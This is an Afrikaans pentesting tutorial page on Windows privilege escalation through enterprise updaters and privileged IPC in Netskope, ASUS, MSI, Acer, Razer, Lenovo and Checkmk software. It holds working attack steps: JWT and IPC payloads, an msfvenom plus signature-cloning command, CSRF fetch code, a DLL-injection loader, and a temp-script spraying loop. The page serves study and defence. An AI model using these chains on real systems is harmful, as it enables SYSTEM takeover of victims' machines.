# Misbruik van Enterprise Auto-Updaters en bevoorregte IPC (bv. Netskope, ASUS en MSI)

{{#include ../../banners/hacktricks-training.md}}

Hierdie bladsy veralgemeen ’n klas Windows plaaslike privilegie-eskalasiekettings wat in enterprise-eindpuntagente en updaters gevind word, wat ’n laedrempel-IPC-koppelvlak en ’n bevoorregte opdateringsvloei blootstel. ’n Verteenwoordigende voorbeeld is Netskope Client for Windows < R129 (CVE-2025-0309), waar ’n gebruiker met lae privilegieë registrasie na ’n aanvaller-beheerde bediener kan dwing en dan ’n kwaadwillige MSI kan lewer wat die SYSTEM-diens installeer.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Belangrike idees wat jy teen soortgelyke produkte kan hergebruik:
- Misbruik ’n bevoorregte diens se localhost IPC om herregistrasie of herkonfigurasie na ’n aanvaller-bediener af te dwing.
- Implementeer die verskaffer se opdateringsendpunte, lewer ’n skelm Trusted Root CA, en wys die updater na ’n kwaadwillige, “signed” pakket.
- Omseil swak ondertekenaarkontroles (CN-toelatingslyste), opsionele digest-vlae en toegeeflike MSI-eienskappe.
- As IPC “encrypted” is, lei die sleutel/IV af van masjienidentifiseerders wat vir almal leesbaar in die registry gestoor is.
- As die diens bellers volgens beeldpad/prosesnaam beperk, spuit kode in ’n proses op die toelatingslys in, of skep een in opgeskorte toestand en laai jou DLL via ’n minimale pleister aan die thread-konteks.

Pasgemaakte plaaslike TCP-dienste verdien dieselfde ondersoek na identiteit en invoergrense, selfs wanneer hulle ’n PIN of ander toepassingbewys vereis. Karteer die listener na sy proses en effektiewe diensrekening, en ondersoek dan die presiese ontplooide binary/weergawe en of velde onder die beller se beheer volgens lengte nagegaan word voordat dit na vaste buffers gekopieer word of gebruik word om ’n child-process-opdrag saam te stel. [Microsoft se leiding oor buffer-oorlopings](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) verduidelik waarom ongetoetste eksterne invoer gevaarlik is in bevoorregte native kode. ’n Loopback-listener, hardgekodeerde geloofsbrief of prosesnaam alleen bewys nie geheuekorrupsie of SYSTEM-uitvoering nie; bereikbaarheid, magtiging, kodepad en versagtingsmaatreëls bly afsonderlike voorwaardes. Hou roetine-opsporing passief eerder as om invoer met crash-lengte na ’n lewendige diens te stuur.

---
## 1) Dwing registrasie na ’n aanvaller-bediener af via localhost IPC

Baie agente sluit ’n gebruikersmodus-UI-proses in wat via localhost TCP met ’n SYSTEM-diens kommunikeer, met JSON.

Waargeneem in Netskope:
- UI: stAgentUI (lae integriteit) ↔ Diens: stAgentSvc (SYSTEM)
- IPC-opdrag-ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Uitbuitingsvloei:
1) Skep ’n JWT-registrasietoken waarvan die claims die backend-gasheer beheer (bv. AddonUrl). Gebruik alg=None sodat geen handtekening vereis word nie.
2) Stuur die IPC-boodskap wat die registrasie-opdrag met jou JWT en tenantnaam aanroep:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Die diens begin jou rogue server kontak vir enrollment/config, bv.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notas:
- As caller-verifikasie op die pad/naam gebaseer is, stuur die versoek vanaf ’n allow-listed vendor binary (sien §4).<sup>[[1]](#references)[[2]](#references)</sup>

### Netwerk-blootgestelde bestuur-IPC

Hierdie trust boundary is nie altyd tot localhost beperk nie. In die gerapporteerde MyReport Updater 2.1.1-geval het ’n `LocalSystem`-diens op alle interfaces geluister en ’n ongeverifieerde gRPC-konfigurasieverandering vir die verwysingsgasheer, -poort en bedryfsmodus aanvaar. Vir die remote variant was beide netwerktoegang tot die listener en uitgaande toegang vanaf die diens na die gekose verwysing nodig. Evalueer dit apart van die vraag of die latere package flow die file-write boundary kan oorsteek.<sup>[[16]](#references)</sup>

---
## 2) Die update channel kaap om code as SYSTEM uit te voer

Sodra die client met jou server kommunikeer, implementeer die verwagte endpoints en stuur dit na ’n attacker MSI. Tipiese volgorde:

1) /v2/config/org/clientconfig → Gee JSON config terug met ’n baie kort updater-interval, bv.:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Stuur ’n PEM CA certificate terug. Die diens installeer dit in die Local Machine Trusted Root-store.
3) /v2/checkupdate → Verskaf metadata wat na ’n kwaadwillige MSI en ’n vals weergawe wys.

Algemene kontroles wat in die praktyk omseil word:
- Signer CN-toelatingslys: die diens kontroleer dalk net of die Subject CN gelyk is aan “netSkope Inc” of “Netskope, Inc.”. Jou rogue CA kan ’n leaf met daardie CN uitreik en die MSI onderteken.
- CERT_DIGEST-eienskap: sluit ’n onskadelike MSI-eienskap met die naam CERT_DIGEST in. Geen afdwinging tydens installasie nie.
- Opsionele digest-afdwinging: ’n config-vlag (bv. check_msi_digest=false) deaktiveer ekstra kriptografiese validering.

Gevolg: die SYSTEM-diens installeer jou MSI vanaf
C:\ProgramData\Netskope\stAgent\data\*.msi
en voer arbitrêre kode uit as NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Les oor die omseiling van pleisters: as ’n vendor reageer deur ’n klein stel “trusted” domains op ’n toelatingslys te plaas in plaas daarvan om die opdateringsbron kriptografies te verifieer, soek na vendor-besitte redirectors of reverse proxies wat jou steeds toelaat om verkeer te stuur. In Netskope se geval het openbare opvolgnavorsing gewys dat ’n toelatingslys uit die R129-era steeds misbruik kon word via `rproxy.goskope.com`, wat inhoud van ’n Azure App Service onder die aanvaller se beheer geproxy het. Beskou toelatingslyste vir gasheername as ’n struikelblok, nie as ’n trust boundary nie.<sup>[[14]](#references)</sup>

Nog ’n foutmodus is **selfkonsekwente, maar nie-gewaarmerkte pakketmetadata**. In die MyReport-geval het ’n verwysing onder die aanvaller se beheer ’n gewysigde argief bedien, terwyl ’n tussenganger die vendor se MD5-digest- en grootte-antwoorde verander het voordat dit die updater bereik het. Deur dié waardes te laat ooreenstem, is net die konsekwentheid van die response nagegaan, nie die vendor se oorsprong nie; ’n MD5-botsing was nie nodig nie. ’n Installasiegids wat deur die oproeper gekies kon word, het daarna die geprivilegieerde uitpakaksie ’n lêerskryfgrens gemaak. Die gevolglike DLL-laaiprimitive word behandel onder [chaining an arbitrary file write into DLL hijacking](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack).<sup>[[16]](#references)</sup>

---
## 3) Vervalsing van geënkripteerde IPC-versoeke (indien teenwoordig)

Vanaf R127 het Netskope IPC-JSON in ’n encryptData-veld toegedraai wat soos Base64 lyk. Omgekeerde analise het AES onthul, met ’n sleutel/IV wat afgelei is van registerwaardes wat vir enige gebruiker leesbaar is:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Aanvallers kan die enkripsie herhaal en geldige geënkripteerde opdragte vanaf ’n standaardgebruiker stuur.<sup>[[1]](#references)[[2]](#references)</sup> Algemene wenk: as ’n agent skielik sy IPC “enkripteer”, soek na toestel-ID’s, produk-GUID’s en installasie-ID’s onder HKLM wat as materiaal gebruik word.

---
## 4) Omseiling van IPC-oproeper se toelatingslyste (pad-/naamkontroles)

Sommige dienste probeer die eweknie verifieer deur die TCP-verbinding se PID op te los en die beeldpad/-naam te vergelyk met vendor-binêre lêers op ’n toelatingslys wat onder Program Files geleë is (bv. stagentui.exe, bwansvc.exe, epdlp.exe).

Twee praktiese omseilings:
- DLL-inspuiting in ’n proses op die toelatingslys (bv. nsdiag.exe) en proxy IPC van binne daardie proses.
- Begin ’n binêre lêer op die toelatingslys in opgeskorte toestand en laai jou proxy-DLL vooraf sonder CreateRemoteThread (sien §5) om aan bestuurder-afgedwonge peuterreëls te voldoen.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Inspuiting wat peuterbeskerming respekteer: opgeskorte proses + NtContinue-pleister

Produkte sluit dikwels ’n minifilter-/OB-callbacks-bestuurder (bv. Stadrv) in om gevaarlike regte te verwyder van handles na beskermde prosesse:
- Proses: verwyder PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: beperk tot THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

’n Betroubare user-mode loader wat hierdie beperkings respekteer:
1) Skep ’n vendor-binêre lêer met CreateProcess en CREATE_SUSPENDED.
2) Verkry handles wat steeds toegelaat word: PROCESS_VM_WRITE | PROCESS_VM_OPERATION op die proses, en ’n thread-handle met THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (of net THREAD_RESUME as jy die kode by ’n bekende RIP pleister).
3) Oorskryf ntdll!NtContinue (of ’n ander vroeë, gewaarborg-gelaaide thunk) met ’n klein stub wat LoadLibraryW op jou DLL-pad aanroep en dan terugspring.
4) Roep ResumeThread aan om jou stub binne die proses te aktiveer en jou DLL te laai.

Omdat jy nooit PROCESS_CREATE_THREAD of PROCESS_SUSPEND_RESUME op ’n proses gebruik het wat reeds beskerm is nie (jy het dit self geskep), voldoen dit aan die bestuurder se beleid.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Praktiese nutsgoed
- NachoVPN (Netskope-inprop) outomatiseer ’n rogue CA, die ondertekening van kwaadwillige MSI’s en die bediening van die nodige endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope is ’n pasgemaakte IPC-kliënt wat arbitrêre (opsioneel AES-geënkripteerde) IPC-boodskappe saamstel en die inspuiting van opgeskorte prosesse insluit om van ’n binêre lêer op die toelatingslys af te stuur.<sup>[[4]](#references)</sup>

## 7) Vinnige triage-werkvloei vir onbekende updater-/IPC-oppervlakke

Wanneer jy ’n nuwe endpoint-agent of “helper”-pakket vir ’n moederbord ondersoek, is ’n vinnige werkvloei gewoonlik genoeg om vas te stel of jy na ’n belowende privesc-teiken kyk:<sup>[[6]](#references)</sup>

1) Lys loopback-luisteraars op en koppel hulle aan vendor-prosesse:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Lys kandidaat-named pipes:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Ontgin register-gesteunde roeteringsdata wat deur plugin-gebaseerde IPC-bedieners gebruik word:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Haal endpoint name, JSON keys en command IDs eers uit die user-mode client. Verpakte Electron/.NET-frontends leak dikwels die volledige skema:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Soek die werklike trust predicate, nie net die code path wat uiteindelik die proses begin nie:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Patrone wat die moeite werd is om voorkeur te gee:
- `CryptQueryObject`/sertifikaatontleding sonder `WinVerifyTrust` beteken gewoonlik dat “sertifikaat bestaan” as “sertifikaat is vertrou” beskou is, wat sertifikaatkloning of ander vals-ondertekenaar-truuks moontlik maak.
- Substring-/agtervoegselkontroles oor `Origin`, `Referer`, aflaai-URL's, prosesname of ondertekenaar-CN's is nie verifikasie nie. `contains(".vendor.com")` is gewoonlik uitbuitbaar met aanvallerbeheerde domeine wat soos die regte domeine lyk.
- As die GUI met lae voorregte besluit “die lêer is vertrou” en die SYSTEM-broker bloot daardie resultaat gebruik, omseil die pleistering of herimplementering van die kliëntkant-DLL/JS dikwels die grens heeltemal (Razer-styl verdeelde validering).
- As die broker 'n payload na `%TEMP%`/`C:\Windows\Temp` kopieer en dit dan vanaf daardie pad valideer of skeduleer, toets onmiddellik vir TOCTOU-vervangingsvensters en vir naburige plugin-modules wat alternatiewe `ExecuteTask()`-omhulsels met swakker kontroles blootstel.<sup>[[6]](#references)</sup>

Vir teikens wat sterk op named pipes steun, is PipeViewer 'n vinnige manier om swak DACL's en pype wat op afstand bereikbaar is, raak te sien voordat jy die protokol in diepte begin reverse-engineer.<sup>[[11]](#references)</sup>

As die teiken bellers slegs volgens PID, beeldpad of prosesnaam verifieer, beskou dit as 'n spoedhobbel eerder as 'n grens: inspuiting in die wettige kliënt, of die verbinding vanaf 'n toegelate proses maak, is dikwels genoeg om aan die bediener se kontroles te voldoen. Vir named pipes spesifiek dek [hierdie bladsy oor kliënt-impersonasie en pipe-misbruik](named-pipe-client-impersonation.md) die primitief in meer diepte.

Vir 'n bevoorregte **opruimings- of herstelbroker**, ondersoek die padvertrouensgrens sowel as die pipe-ACL. 'n Beller met laer voorregte kan moontlik 'n herstelbestemming kies of 'n opgevoer-rugsteunartefak in 'n gedeelde gids hernoem, selfs wanneer die diensuitvoerbare lêer en sy installasiegids beskerm is. Bevestig afsonderlik dat die beller die herstelopdrag kan bereik, die presiese opgevoer-invoer of lêernaam kan wysig, die broker onder 'n hoër identiteit loop, en die herstelbewerking werklik na die gekose beskermde pad skryf. 'n Skryfbare opvoer-gids of 'n leesbare pipe bewys op sigself nie dat 'n arbitrêre bevoorregte skryfaksie moontlik is nie; die bestemmingkartering en diensgedrag moet deur kodehersiening of beheerde toetsing nagegaan word. Moenie 'n onbekende opruimingsopdrag tydens passiewe enumerasie uitvoer nie, want dit kan gebruikerslêers uitvee.

---
## 8) Modulêre add-in-brokers wat slegs deur verskafferhandtekeninge geverifieer word (Lenovo Vantage-patroon)

'n Nuwer variasie wat die moeite werd is om na te speur, is die **signed-client RPC broker**: 'n Lenovo-ondertekende lessenaartoepassing met lae voorregte kommunikeer met 'n SYSTEM-diens, en die diens stuur JSON-opdragte na 'n stel XML-beskrewe add-ins onder `%ProgramData%`. Sodra kode-uitvoering **binne enige aanvaarde ondertekende kliënt** verkry is, word elke `runas="system"`-kontrak deel van jou aanvalsvlak.<sup>[[15]](#references)</sup>

Primitiewe met hoë waarde wat in Lenovo Vantage-navorsing waargeneem is:
- **Vertroue in die beller omdat dit deur die verskaffer onderteken is**: navorsers het 'n geverifieerde konteks bereik deur 'n Lenovo-ondertekende EXE na 'n skryfbare gids te kopieer en 'n DLL-side-load (`profapi.dll`) te bewerkstellig sodat arbitrêre kode binne 'n kliënt loop wat die diens reeds vertrou het.
- **Ontdekking van die aanvalsvlak deur manifeste**: add-ins word verklaar onder `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; verskeie kontrakte loop as `SYSTEM`, dus onthul die enumerasie van daardie manifeste dikwels die werklike bevoorregte aksies vinniger as om die broker self te reverse-engineer.
- **Foute per opdrag agter die geverifieerde kanaal**: sodra jy binne die vertroude kliënt is, het openbare navorsing padtraversering plus resiesvoorwaardes in opdaterings-/installasie-aksies, misbruik van rou SQL in bevoorregte instellingsdatabasisse, en substring-gebaseerde registerpadkontroles gevind wat skrywe buite die bedoelde hive moontlik gemaak het.

Nuttige verkenning op 'n teiken:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Praktiese gevolgtrekking: wanneer ’n helper suite ’n broker blootstel wat eers die **caller process** verifieer en eers daarna dosyne plugin/add-in-opdragte uitvoer, moenie ophou nadat jy die vertrouenskontrole by die voordeur omseil het nie. Dump die manifest/contract-tabel en fuzz elke hoëprivilege-werkwoord afsonderlik; die geverifieerde kanaal verberg gewoonlik verskeie tweede-fase-foute.

---
## 1) CSRF van blaaier na localhost teen bevoorregte HTTP-API’s (ASUS DriverHub)

DriverHub lewer ’n user-mode HTTP-diens (ADU.exe) op 127.0.0.1:53000 wat verwag dat blaaierversoeke van https://driverhub.asus.com kom. Die oorsprongfilter voer bloot `string_contains(".asus.com")` op die Origin-header en op aflaai-URL’s wat deur `/asus/v1.0/*` blootgestel word, uit. Enige aanvallerbeheerde gasheer, soos `https://driverhub.asus.com.attacker.tld`, slaag dus die kontrole en kan toestandveranderende versoeke vanaf JavaScript stuur.<sup>[[6]](#references)</sup> Sien [CSRF-basics](../../pentesting-web/csrf-cross-site-request-forgery.md) vir bykomende omseilpatrone.

Praktiese vloei:
1) Registreer ’n domein wat `.asus.com` bevat en huisves ’n kwaadwillige webblad daarop.
2) Gebruik `fetch` of XHR om ’n bevoorregte eindpunt (bv. `Reboot`, `UpdateApp`) op `http://127.0.0.1:53000` aan te roep.
3) Stuur die JSON-liggaam wat die handler verwag – die gepakte frontend-JS wys die skema hieronder.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Selfs die PowerShell CLI wat hieronder gewys word, slaag wanneer die Origin-kopskrif na die vertroude waarde vervals word:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Enige blaaiersbesoek aan die aanvaller se webwerf word dus ’n plaaslike CSRF met 1 klik (of 0 klikke via `onload`) wat ’n SYSTEM-helper aanstuur.

---
## 2) Onveilige code-signing-verifikasie & sertifikaatkloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` laai arbitrêre uitvoerbare lêers af wat in die JSON-liggaam gedefinieer word, en kas dit in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. URL-validering vir aflaaie hergebruik dieselfde substring-logika, dus word `http://updates.asus.com.attacker.tld:8000/payload.exe` aanvaar. Ná die aflaai kontroleer ADU.exe bloot dat die PE ’n handtekening bevat en dat die Subject-string met ASUS ooreenstem voordat dit die lêer laat loop – geen `WinVerifyTrust` of kettingvalidering nie.

Om die vloei te bewapen:
1) Skep ’n payload (bv. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Kloon ASUS se ondertekenaar daarin (bv. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Gasheer `pwn.exe` op ’n `.asus.com`-nabootsingsdomein en aktiveer UpdateApp via die bogenoemde blaaier-CSRF.

Omdat beide die Origin- en URL-filters substring-gebaseer is en die ondertekenaarkontrole slegs strings vergelyk, laai DriverHub die aanvaller se binêre lêer af en voer dit in sy verhoogde konteks uit.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU binne die kopieer-/uitvoerpaaie van die updater (MSI Center CMD_AutoUpdateSDK)

MSI Center se SYSTEM-diens stel ’n TCP-protokol beskikbaar waarin elke raam `4-byte ComponentID || 8-byte CommandID || ASCII arguments` is. Die kernkomponent (Component ID `0f 27 00 00`) bevat `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Sy hanteerder:
1) Kopieer die gegewe uitvoerbare lêer na `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifieer die handtekening via `CS_CommonAPI.EX_CA::Verify` (die sertifikaatonderwerp moet gelyk wees aan “MICRO-STAR INTERNATIONAL CO., LTD.” en `WinVerifyTrust` moet slaag).
3) Skep ’n geskeduleerde taak wat die tydelike lêer as SYSTEM met aanvallerbeheerde argumente laat loop.

Die gekopieerde lêer word nie tussen verifikasie en `ExecuteTask()` gesluit nie. ’n Aanvaller kan:
- Raam A stuur wat na ’n wettige MSI-ondertekende binêre lêer verwys (dit verseker dat die handtekeningkontrole slaag en die taak in die ry geplaas word).
- Dit met herhaalde Raam B-boodskappe laat saamloop wat na ’n kwaadwillige payload verwys, en `MSI Center SDK.exe` oorskryf net nadat die verifikasie voltooi is.

Wanneer die skeduleerder die taak uitvoer, laat dit die oorskryfde payload as SYSTEM loop, ondanks dat die oorspronklike lêer gevalideer is. Betroubare uitbuiting gebruik twee goroutines/threads wat `CMD_AutoUpdateSDK` oor en oor stuur totdat die TOCTOU-venster gewen word.<sup>[[6]](#references)</sup>

---
## 2) Misbruik van pasgemaakte SYSTEM-vlak-IPC en impersonasie (MSI Center + Acer Control Centre)

### MSI Center TCP-opdragstelle
- Elke plugin/DLL wat deur `MSI.CentralServer.exe` gelaai word, kry ’n Component ID wat onder `HKLM\SOFTWARE\MSI\MSI_CentralServer` gestoor word. Die eerste 4 grepe van ’n raam kies daardie komponent, sodat aanvallers opdragte na arbitrêre modules kan stuur.
- Plugins kan hul eie taakuitvoerders definieer. `Support\API_Support.dll` stel `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` beskikbaar en roep `API_Support.EX_Task::ExecuteTask()` direk aan, **sonder handtekeningvalidering** – enige plaaslike gebruiker kan dit na `C:\Users\<user>\Desktop\payload.exe` laat wys en sodoende op deterministiese wyse SYSTEM-uitvoering verkry.
- Deur loopback-verkeer met Wireshark te snuif of die .NET-binêre lêers in dnSpy te instrumenteer, kan die Component ↔ command-kartering vinnig onthul word; pasgemaakte Go-/Python-kliënte kan dan rame herhaal.<sup>[[6]](#references)</sup>

### Acer Control Centre named pipes en impersonasievlakke
- `ACCSvc.exe` (SYSTEM) stel `\\.\pipe\treadstone_service_LightMode` beskikbaar, en sy discretionary ACL laat afgeleë kliënte toe (bv. `\\TARGET\pipe\treadstone_service_LightMode`). Deur opdrag-ID `7` met ’n lêerpad te stuur, word die diens se prosesbeginroetine aangeroep.
- Die kliëntbiblioteek serialiseer ’n magiese terminator-greep (113) saam met die args. Dinamiese instrumentering met Frida/`TsDotNetLib` (sien [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) vir instrumenteringswenke) wys dat die native hanteerder hierdie waarde na ’n `SECURITY_IMPERSONATION_LEVEL` en integriteit-SID karteer voordat dit `CreateProcessAsUser` aanroep.
- Deur 113 (`0x71`) met 114 (`0x72`) te vervang, beland die uitvoering in die generiese vertakking wat die volledige SYSTEM-token behou en ’n hoë-integriteit-SID (`S-1-16-12288`) stel. Die nuwe proses loop dus as onbeperkte SYSTEM, sowel plaaslik as oor masjiene heen.
- Kombineer dit met die beskikbare installer-vlag (`Setup.exe -nocheck`) om ACC selfs op lab-VM’s op te stel en die pipe sonder verkoperhardeware te toets.<sup>[[6]](#references)</sup>

Hierdie IPC-foute beklemtoon waarom localhost-dienste wedersydse verifikasie moet afdwing (ALPC-SIDs, `ImpersonationLevel=Impersonation`-filters, tokenfiltrering), en waarom elke module se helper vir “arbitrêre binêre lêer laat loop” dieselfde ondertekenaarverifikasies moet gebruik.

---
## 3) COM/IPC-“elevator”-helpers wat op swak user-mode-validering berus (Razer Synapse 4)

Razer Synapse 4 het nog ’n nuttige patroon by hierdie familie gevoeg: ’n gebruiker met lae voorregte kan ’n COM-helper vra om ’n proses via `RzUtility.Elevator` te begin, terwyl die vertrouensbesluit aan ’n user-mode-DLL (`simple_service.dll`) oorgelaat word, eerder as om dit binne die bevoorregte grens robuust af te dwing.

Waargenome uitbuitingspad:
- Instansieer die COM-objek `RzUtility.Elevator`.
- Roep `LaunchProcessNoWait(<path>, "", 1)` aan om ’n verhoogde bekendstelling aan te vra.
- In die openbare PoC word die PE-handtekeninghek binne `simple_service.dll` reggemaak voordat die versoek gestuur word, sodat enige uitvoerbare lêer wat die aanvaller kies, bekendgestel kan word.<sup>[[6]](#references)[[10]](#references)</sup>

Minimale PowerShell-aanroep:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Algemene gevolgtrekking: wanneer jy “helper”-suites reverse-engineer, moenie by localhost TCP of named pipes ophou nie. Kyk vir COM-klasse met name soos `Elevator`, `Launcher`, `Updater` of `Utility`, en verifieer dan of die bevoorregte diens self die teikenbinary valideer of bloot ’n resultaat vertrou wat deur ’n veranderbare user-mode-kliënt-DLL bereken is. Hierdie patroon strek verder as Razer: enige gesplete ontwerp waar die hoëbevoorregte broker ’n allow/deny-besluit van die laebevoorregte kant ontvang, is ’n moontlike privesc-aanvalsoppervlak.


---
## Voorspelbare uitvoering van tydelike skripte tydens MSI-herstel (Checkmk Agent / CVE-2024-0670)

Sommige Windows-agente implementeer steeds bevoorregte aksies deur ’n tydelike `.cmd` in `C:\Windows\Temp` te skryf en dit as `SYSTEM` uit te voer. As die lêernaam voorspelbaar is en die diens nie bestaande lêers veilig herskep nie, kan ’n gebruiker met lae voorregte die toekomstige tydelike lêer vooraf as **leesalleen** skep en die bevoorregte proses dwing om aanvallerbeheerde inhoud uit te voer in plaas van sy eie skrip.

Waargeneem in kwesbare Checkmk Agent-bouweergawes:
- tydelike patroon: `cmk_all_<PID>_1.cmd`
- geraakte takke: `2.0.0`, `2.1.0`, `2.2.0`
- sneller: MSI-**herstel** van die kasgeheue-agentpakket<sup>[[8]](#references)[[9]](#references)</sup>

Praktiese werksvloei:
1. Skat ’n realistiese PID-reeks op grond van huidige proses-ID’s of die lopende agent-PID.
2. Skryf ’n kort `.cmd`-lading in **ASCII** (`Set-Content -Encoding Ascii` of `cmd.exe`-herleiding; vermy UTF-16 PowerShell-uitvoer vir bondellêers).
3. Versprei `C:\Windows\Temp\cmk_all_<PID>_1.cmd` oor die kandidaat-reeks en merk elke lêer as leesalleen.
4. Sneller ’n herstel van die MSI in die kasgeheue sodat die bevoorregte diens probeer om die tydelike skrip te herskep en dit daarna uit te voer.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

As die kwesbare produk met Windows Installer geïnstalleer is, koppel die lukraak lykende MSI-lêer in die kas onder `C:\Windows\Installer` aan sy produknaam voordat jy die herstel aktiveer:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Operasionele notas:
- `qwinsta` is nuttig wanneer `msiexec /fa` vanuit ’n nie-interaktiewe WinRM-shell misluk en jy moet vasstel of ’n bestaande lessenaar-/ontkoppelde sessie die herstelwerk korrek kan aktiveer.<sup>[[7]](#references)</sup>
- Hierdie patroon is ook van toepassing op ander endpoint-agents en updaters wat **temp-skripte in wêreldskryfbare liggings plaas en dit later as SYSTEM uitvoer**. Toets vir voorspelbare name, ontbrekende eksklusiewe-skepping-semantiek en herstel-/opdateringsvloeie wat op aanvraag geaktiveer kan word.

### Interaktiewe installer-herstel en bevoorregte konsole

PDF24 Creator 11.15.1 illustreer ’n afsonderlike MSI-herstelrisiko: die pasgemaakte drukker-installasieaksie kan tydens herstel ’n sigbare konsole met SYSTEM-regte begin. Die verskaffer het die MSI-installeerder in 11.15.2 verander om hierdie gedrag aan te spreek. ’n Ouer produkweergawe is slegs ’n leidraad vir triage. Gaan die geregistreerde of bereikbare MSI-pakket na, of hierdie gebruiker herstelwerk kan begin, of die kwesbare pasgemaakte aksie en loglêervertraging teenwoordig is, en of ’n interaktiewe lessenaar die konsole kan blootlê. Die gerapporteerde vertraging het ’n oplock op `faxPrnInst.log` gebruik; gewone skryfbaarheid van die lêer is nie die enigste toegangsvoorwaarde nie. ’n Nie-interaktiewe shell, ontoeganklike pakket of reggestelde installeerder kan die ketting verbreek. Hierdie probleem hang nie van `AlwaysInstallElevated` af nie en verskil van die vervanging van ’n voorspelbare tydelike skrip.

---
## Afgeleë voorsieningskettingkaping via swak updater-validering (WinGUp / Notepad++)

Tussen Junie 2025 en Desember 2025 het aanvallers wat die gasheer-infrastruktuur agter die Notepad++-opdateringsvloei gekompromitteer het, kwaadwillige manifeste selektief aan uitgesoekte slagoffers gelewer. Ouer WinGUp-gebaseerde updaters het nie die egtheid van opdaterings volledig geverifieer nie, dus kon ’n kwaadwillige XML-antwoord kliënte na aanvallerbeheerde URL’s herlei. Omdat die kliënt HTTPS-inhoud aanvaar het sonder om beide ’n vertroude sertifikaatketting en ’n geldige PE-handtekening op die afgelaaide installeerder af te dwing, het slagoffers ’n getrojaniseerde NSIS-`update.exe` afgelaai en uitgevoer.<sup>[[12]](#references)[[13]](#references)</sup>

Operasionele vloei (geen plaaslike uitbuiting nodig nie):
1. **Infrastruktuuronderskepping**: kompromitteer CDN/gasheerinfrastruktuur en reageer op opdateringkontroles met aanvaller-metadata wat na ’n kwaadwillige aflaai-URL wys.
2. **Getrojaniseerde NSIS**: die installeerder laai ’n payload af/voer dit uit en misbruik twee uitvoeringskettings:
